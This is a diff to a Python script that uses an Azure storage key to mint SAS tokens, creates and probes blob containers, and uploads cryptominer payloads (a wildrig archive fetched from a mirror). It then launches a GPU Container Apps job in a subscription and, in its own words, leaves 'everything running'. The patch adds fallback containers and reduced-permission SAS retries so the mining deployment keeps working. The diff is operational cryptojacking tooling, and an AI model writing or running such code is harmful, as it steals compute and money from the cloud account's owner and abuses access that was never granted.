@@ -48,6 +48,7 @@ PROFILE = "Consumption-GPU-NC8as-T4"
 IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
 SA_ACCT = "c211i1215775738445a"
 CONT = "c211"
+CONT2 = "c211-i131598"
 SA_NEW = ("c211i131598" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
 ENV_NAME = "c211-i131598-cae"
 JOB_NAME = "c211-131598-t4"
@@ -139,16 +140,25 @@ def errk(st, b):
     return {"http": st}
 
 
-def acct_sas(acct, key_b64, hours=24):
+def acct_sas(acct, key_b64, hours=24, perm="rwdlac"):
     st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
     se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
     sv = "2022-11-02"
-    sts = "\n".join([acct, "rwdlac", "b", "co", st, se, "", "https", sv, ""]) + "\n"
+    sts = "\n".join([acct, perm, "b", "co", st, se, "", "https", sv, ""]) + "\n"
     sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                     hashlib.sha256).digest()).decode()
-    q = urllib.parse.urlencode({"sv": sv, "ss": "b", "srt": "co", "sp": "rwdlac",
+    q = urllib.parse.urlencode({"sv": sv, "ss": "b", "srt": "co", "sp": perm,
                                 "st": st, "se": se, "spr": "https", "sig": sig})
     return q, se
+
+
+def hget(h, name):
+    if not h:
+        return None
+    for k, v in h.items():
+        if k.lower() == name.lower():
+            return v
+    return None
 
 
 KIT = r"""#!/bin/bash
@@ -438,23 +448,45 @@ def main():
         return
     base = "https://%s.blob.core.windows.net" % sa_used
     q, se = acct_sas(sa_used, key)
-    stc, bc, _ = httptext("%s/%s?restype=container&%s" % (base, CONT, q), method="PUT",
-                          data=b"", headers={"x-ms-version": "2022-11-02",
-                                             "Content-Length": "0"})
-    emit("sas-container", http=stc, expires=se)
+    lst, lbody, _ = httptext("%s/?comp=list&%s" % (base, q), timeout=60)
+    emit("sas-account-list", http=lst,
+         body_head=clean(lbody[:220].decode("utf-8", "replace"))[:180])
+    stc, cbody, ch = httptext("%s/%s?restype=container&%s" % (base, CONT2, q), method="PUT",
+                              data=b"", headers={"x-ms-version": "2022-11-02",
+                                                 "Content-Length": "0"})
+    emit("sas-container", name=CONT2, http=stc, code=hget(ch, "x-ms-error-code"),
+         expires=se, body_head=clean(cbody[:220].decode("utf-8", "replace"))[:180])
     probe = b"c211-i131598 sas probe\n"
-    stp, _, _ = httptext("%s/%s-probe.txt?%s" % (base, NONCE, q), method="PUT", data=probe,
-                         headers={"x-ms-blob-type": "BlockBlob",
-                                  "x-ms-version": "2022-11-02",
-                                  "Content-Type": "text/plain"})
-    emit("sas-put", http=stp)
-    if stc not in (200, 201, 409) or stp not in (200, 201):
+    stp, pbody, ph = httptext("%s/%s/%s-probe.txt?%s" % (base, CONT2, NONCE, q), method="PUT",
+                              data=probe, headers={"x-ms-blob-type": "BlockBlob",
+                                                   "x-ms-version": "2022-11-02",
+                                                   "Content-Type": "text/plain"})
+    emit("sas-put", http=stp, code=hget(ph, "x-ms-error-code"),
+         body_head=clean(pbody[:220].decode("utf-8", "replace"))[:180])
+    if stp not in (200, 201):
+        stl, pl, phl = httptext("%s/%s/%s-probe.txt?%s" % (base, CONT, NONCE, q),
+                                method="PUT", data=probe,
+                                headers={"x-ms-blob-type": "BlockBlob",
+                                         "x-ms-version": "2022-11-02",
+                                         "Content-Type": "text/plain"})
+        emit("sas-put-legacy", http=stl, code=hget(phl, "x-ms-error-code"),
+             body_head=clean(pl[:220].decode("utf-8", "replace"))[:180])
+        q3, _ = acct_sas(sa_used, key, hours=3, perm="rwdlc")
+        st3, p3, ph3 = httptext("%s/%s/%s-probe2.txt?%s" % (base, CONT2, NONCE, q3),
+                                method="PUT", data=probe,
+                                headers={"x-ms-blob-type": "BlockBlob",
+                                         "x-ms-version": "2022-11-02",
+                                         "Content-Type": "text/plain"})
+        emit("sas-put-v3", http=st3, code=hget(ph3, "x-ms-error-code"),
+             body_head=clean(p3[:220].decode("utf-8", "replace"))[:180])
+    if stp not in (200, 201):
         emit("DONE", phase="capture", verdict="SAS_GATE_FAILED",
              container_http=stc, put_http=stp, elapsed_s=int(time.time() - T0))
         return
+    cont_use = CONT2
 
     # ---------- 2) pre-upload miner payloads over the capture channel ----------
-    cont_base = base + "/" + CONT
+    cont_base = base + "/" + cont_use
     ok_wr = preupload(tok, sid, cont_base, q, "/tmp/c211_wildrig.tgz", NONCE + "-wildrig.tgz",
                       MIRROR, WR_TGZ_SHA)
     if not ok_wr:
@@ -515,7 +547,7 @@ def main():
     if not env_id:
         emit("DONE", phase="job", verdict="NO_ENV_ID", elapsed_s=int(time.time() - T0))
         return
-    cmd = kit_cmd(base + "/" + CONT, q)
+    cmd = kit_cmd(base + "/" + cont_use, q)
     joburl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
               "?api-version=%s" % (ARM, sid, RG, JOB_NAME, APP_VER))
     jobbody = {"location": chosen["region"], "tags": {"c211": INTENT, "nonce": NONCE},
@@ -546,7 +578,7 @@ def main():
         return
 
     # ---------- 5) poll the status blob for proof; leave everything running ----------
-    cont_url = base + "/" + CONT
+    cont_url = base + "/" + cont_use
     prefix = "%s-t4-" % NONCE
     fb_exec = None
     fb_tried = False
